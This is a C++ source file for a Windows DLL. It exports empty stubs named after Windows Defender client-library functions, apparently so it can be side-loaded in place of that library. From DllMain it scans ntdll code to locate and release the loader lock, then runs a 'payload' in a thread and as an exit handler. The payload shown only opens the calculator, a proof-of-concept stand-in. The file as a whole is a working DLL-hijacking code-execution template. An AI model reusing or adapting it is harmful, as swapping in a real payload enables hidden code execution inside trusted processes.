// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
// Copyright (C) 2023 Elliot Killick <contact@elliotkillick.com>
// Licensed under the MIT License. See LICENSE file for details.

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winternl.h> 
#include <process.h> 
#include <shellapi.h> 

#define DLL

// Standard EXE/DLL API boilerplate
#ifdef DLL
#define API __declspec(dllexport)
#define EMPTY_IMPL {}
#else
#define API __declspec(dllimport)
#define EMPTY_IMPL
#endif

EXTERN_C API VOID MpUpdateStartEx(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpClientUtilExportFunctions(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpFreeMemory(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpManagerEnable(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpNotificationRegister(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpManagerOpen(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpHandleClose(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpManagerVersionQuery(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpCleanStart(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpThreatOpen(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpScanStart(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpScanResult(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpCleanOpen(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpThreatEnumerate(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpRemapCallistoDetections(VOID) EMPTY_IMPL;

VOID payload(VOID) {
    ShellExecute(NULL, L"open", L"calc", NULL, NULL, SW_SHOW);
}

EXTERN_C NTSTATUS NTAPI LdrUnlockLoaderLock(_In_ ULONG Flags, _In_opt_ ULONG_PTR Cookie);
EXTERN_C NTSTATUS NTAPI LdrLockLoaderLock(_In_ ULONG Flags, _Out_opt_ PULONG Disposition, _Out_opt_ PULONG_PTR Cookie);
EXTERN_C NTSYSAPI void DECLSPEC_NORETURN WINAPI RtlExitUserProcess(NTSTATUS Status);
EXTERN_C NTSTATUS NTAPI LdrAddRefDll(IN ULONG Flags, IN PVOID BaseAddress);

PCRITICAL_SECTION getLdrpLoaderLockAddress(VOID) {
    PBYTE ldrUnlockLoaderLockSearchCounter = (PBYTE)&LdrUnlockLoaderLock;
    const BYTE callAddressOpcode = 0xe8;
    const BYTE callAddressInstructionSize = sizeof(callAddressOpcode) + sizeof(INT32);

    const BYTE jmpAddressRelativeOpcode = 0xeb;

    while (TRUE) {
        if (*ldrUnlockLoaderLockSearchCounter == callAddressOpcode) {

            if (*(ldrUnlockLoaderLockSearchCounter + callAddressInstructionSize) == jmpAddressRelativeOpcode)
                break;
        }

        ldrUnlockLoaderLockSearchCounter++;
    }

    INT32 rel32EncodedAddress = *(PINT32)(ldrUnlockLoaderLockSearchCounter + sizeof(callAddressOpcode));

    typedef INT32(NTAPI* LdrpReleaseLoaderLockType)(OUT PBYTE, INT32, INT32);

    LdrpReleaseLoaderLockType LdrpReleaseLoaderLock = (LdrpReleaseLoaderLockType)(ldrUnlockLoaderLockSearchCounter + callAddressInstructionSize + rel32EncodedAddress);

    PBYTE ldrpReleaseLoaderLockAddressSearchCounter = (PBYTE)LdrpReleaseLoaderLock;

    const USHORT leaCxRegisterOpcode = 0x0d8d;
    const BYTE leaCxRegisterOpcodeInstructionSize = sizeof(leaCxRegisterOpcode) + sizeof(INT32);

    while (TRUE) {
        if (*(PUSHORT)ldrpReleaseLoaderLockAddressSearchCounter == leaCxRegisterOpcode)
            break;

        ldrpReleaseLoaderLockAddressSearchCounter++;
    }


    rel32EncodedAddress = *(PINT32)(ldrpReleaseLoaderLockAddressSearchCounter + sizeof(leaCxRegisterOpcode));
    PCRITICAL_SECTION LdrpLoaderLock = (PCRITICAL_SECTION)(ldrpReleaseLoaderLockAddressSearchCounter + leaCxRegisterOpcodeInstructionSize + rel32EncodedAddress);

    return LdrpLoaderLock;
}

VOID preloadLibrariesForCurrentThread(VOID) {

    LoadLibrary(L"SHCORE");
    LoadLibrary(L"msvcrt");
    LoadLibrary(L"combase");
    LoadLibrary(L"RPCRT4");
    LoadLibrary(L"bcryptPrimitives");
    LoadLibrary(L"shlwapi");
    LoadLibrary(L"windows.storage.dll"); 
    LoadLibrary(L"Wldp");
    LoadLibrary(L"advapi32");
    LoadLibrary(L"sechost");
}

PULONG64 getLdrpWorkInProgressAddress() {

    PBYTE rtlExitUserProcessAddressSearchCounter = (PBYTE)&RtlExitUserProcess;

    const BYTE callAddressOpcode = 0xe8;
    const BYTE callAddressInstructionSize = sizeof(callAddressOpcode) + sizeof(INT32);
    while (TRUE) {
        if (*rtlExitUserProcessAddressSearchCounter == callAddressOpcode) {
            if (*(rtlExitUserProcessAddressSearchCounter + callAddressInstructionSize) == callAddressOpcode)
                break;
        }

        rtlExitUserProcessAddressSearchCounter++;
    }

    INT32 rel32EncodedAddress = *(PINT32)(rtlExitUserProcessAddressSearchCounter + sizeof(callAddressOpcode));
    PBYTE ldrpDrainWorkQueue = (PBYTE)(rtlExitUserProcessAddressSearchCounter + callAddressInstructionSize + rel32EncodedAddress);
    PBYTE ldrpDrainWorkQueueAddressSearchCounter = ldrpDrainWorkQueue;
    const USHORT movDwordAddressValueOpcode = 0x05c7;
    const BYTE movDwordAddressValueInstructionSize = sizeof(movDwordAddressValueOpcode) + sizeof(INT32) + sizeof(INT32);

    while (TRUE) {
        if (*(PUSHORT)ldrpDrainWorkQueueAddressSearchCounter == movDwordAddressValueOpcode) {

            if (*(PBOOL)(ldrpDrainWorkQueueAddressSearchCounter + movDwordAddressValueInstructionSize - sizeof(INT32)) == TRUE)
                break;
        }

        ldrpDrainWorkQueueAddressSearchCounter++;
    }

    rel32EncodedAddress = *(PINT32)(ldrpDrainWorkQueueAddressSearchCounter + sizeof(movDwordAddressValueOpcode));
    PULONG64 LdrpWorkInProgress = (PULONG64)(ldrpDrainWorkQueueAddressSearchCounter + movDwordAddressValueInstructionSize + rel32EncodedAddress);

    return LdrpWorkInProgress;
}

#define LdrpInitCompleteEvent (HANDLE)0x4
#define LdrpLoadCompleteEvent (HANDLE)0x3c
#define LdrpWorkCompleteEvent (HANDLE)0x40


PULONG64 LdrpWorkInProgress;

VOID myLdrpDropLastInProgressCount(VOID) {

    *LdrpWorkInProgress = 0;

    SetEvent(LdrpLoadCompleteEvent);
}

VOID myLdrpDrainWorkQueue(VOID) {


    BOOL CompleteRetryOrReturn = FALSE;
        while (TRUE) {

            if (*LdrpWorkInProgress == 0) {
                *LdrpWorkInProgress = 1;
                CompleteRetryOrReturn = TRUE;
            }


            if (CompleteRetryOrReturn)
                break;

            WaitForSingleObject(LdrpLoadCompleteEvent, INFINITE);
        }


}

#undef RUN_PAYLOAD_DIRECTLY_FROM_DLLMAIN

VOID LdrFullUnlock(VOID) {
    const PCRITICAL_SECTION LdrpLoaderLock = getLdrpLoaderLockAddress();
    LdrpWorkInProgress = getLdrpWorkInProgressAddress();

#ifdef RUN_PAYLOAD_DIRECTLY_FROM_DLLMAIN
    preloadLibrariesForCurrentThread();
#endif
    LeaveCriticalSection(LdrpLoaderLock);
    myLdrpDropLastInProgressCount();

    SetEvent(LdrpInitCompleteEvent);

#ifdef RUN_PAYLOAD_DIRECTLY_FROM_DLLMAIN
    payload();
#else
    DWORD payloadThreadId;
    HANDLE payloadThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, &payloadThreadId);
    if (payloadThread)
        WaitForSingleObject(payloadThread, INFINITE);
#endif
    
    myLdrpDrainWorkQueue();
    EnterCriticalSection(LdrpLoaderLock);
}


#undef MSVCRT_ORIGINAL

#ifdef MSVCRT_ORIGINAL
HMODULE msvcrtHandle;
#endif

#ifdef MSVCRT_ORIGINAL
VOID MsvcrtAtexitHandler(VOID) {
    FARPROC msvcrtUnlockAddress = GetProcAddress(msvcrtHandle, "_unlock");
    typedef void(__cdecl* msvcrtUnlockType)(int);
    msvcrtUnlockType msvcrtUnlock = (msvcrtUnlockType)(msvcrtUnlockAddress);
    
    msvcrtUnlock(8);

    payload();

    Sleep(3000);

    FARPROC msvcrtLockAddress = GetProcAddress(msvcrtHandle, "_lock");
    typedef void(__cdecl* msvcrtLockType)(int);
    msvcrtLockType msvcrtLock = (msvcrtLockType)(msvcrtLockAddress);
    msvcrtLock(8);
}
#endif


#define LDR_ADDREF_DLL_PIN 0x00000001

VOID LdrLockEscapeAtCrtExit(PVOID isStaticLoad, HINSTANCE dllHandle) {

#ifndef MSVCRT_ORIGINAL
    _crt_atexit(payload);
    _crt_at_quick_exit(payload);
#else
    msvcrtHandle = GetModuleHandle(L"msvcrt");
    if (msvcrtHandle == NULL)
        return;
    FARPROC msvcrtAtexitAddress = GetProcAddress(msvcrtHandle, "atexit");

    
    typedef int(__cdecl* msvcrtAtexitType)(void(__cdecl*)(void));

    msvcrtAtexitType msvcrtAtexit = (msvcrtAtexitType)(msvcrtAtexitAddress);
    msvcrtAtexit(MsvcrtAtexitHandler);
#endif

    
    if (!isStaticLoad)
        
        LdrAddRefDll(LDR_ADDREF_DLL_PIN, dllHandle);

  
}

#undef I_PLEDGE_NOT_TO_UNLOCK_THE_LOADER_IN_MY_PRODUCTION_APP

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

#ifdef I_PLEDGE_NOT_TO_UNLOCK_THE_LOADER_IN_MY_PRODUCTION_APP
        LdrFullUnlock();
#endif
        LdrLockEscapeAtCrtExit(lpReserved, hinstDll);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    
    return TRUE;
}


